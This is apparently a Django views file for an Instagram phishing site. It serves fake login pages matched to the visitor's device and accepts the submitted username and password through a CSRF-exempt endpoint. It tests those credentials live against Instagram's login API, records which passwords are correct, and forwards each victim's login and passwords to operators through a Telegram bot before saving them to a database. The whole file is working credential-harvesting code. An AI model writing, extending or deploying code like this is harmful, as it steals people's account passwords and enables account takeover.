from django.shortcuts import render
from django.http import HttpResponse
import requests
import time
from django.views.decorators.csrf import csrf_exempt
from django_user_agents.utils import get_user_agent
from .content import *
from .telegrambot import getBot
from telegram import *
from telegram.ext import *

def current_milli_time():
    return round(time.time() * 1000)


def loginFunc(login, password):
    print('processing login func: %s | %s' % (login, password))
    res = requests.get('https://www.instagram.com/')
    token = res.cookies["csrftoken"]

    cookies = {"csrftoken": token}

    headers = {"X-CSRFToken": token,
               "User-Agent": "Other"}
    userPassword = password
    password = "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (current_milli_time(), password)

    params = {"enc_password": password, "username": login}
    res = requests.post('https://www.instagram.com/accounts/login/ajax/', cookies=cookies, params=params,
                        headers=headers)

    if instaContainer.models.get(login) is None:
        instaContainer.models[login] = InstModel()

    print("Login container %s" % instaContainer.models[login])
    print(res.content.decode("utf-8"))
    resContent = res.content.decode("utf-8")
    if "authenticated" in resContent or "fail" in resContent or "error" in resContent:
        if userPassword not in instaContainer.models[login].wrongPass:
            instaContainer.models[login].wrongPass.append(userPassword)
            print("%s : added wrong pass" % login)
    else:
        if userPassword not in instaContainer.models[login].correctPass:
            instaContainer.models[login].correctPass.append(userPassword)
            print("%s : added correct pass" % login)

    for user in allowedContainer.models:
        keyBoard = [[InlineKeyboardButton("Показати всіх користувачів", callback_data="showAllUsers")]]
        markUp = InlineKeyboardMarkup(keyBoard)
        getBot().send_message(user, text= login + "\n" + instaContainer.models[login].toStr(),reply_markup=markUp)


    updateData(session, InstaContainerDB, instaContainer)
    return res


def mobile_login(request):
    return render(request, "mobile-login.html")


def home(request):
    user_agent = get_user_agent(request)
    if (user_agent.is_pc):
        return render(request, "computer-enter.html")
    else:
        return render(request, "mobile-enter.html")


@csrf_exempt
def ajax(request):
    return HttpResponse(loginFunc(request.POST.get("userName", ''), request.POST.get("password", '')))
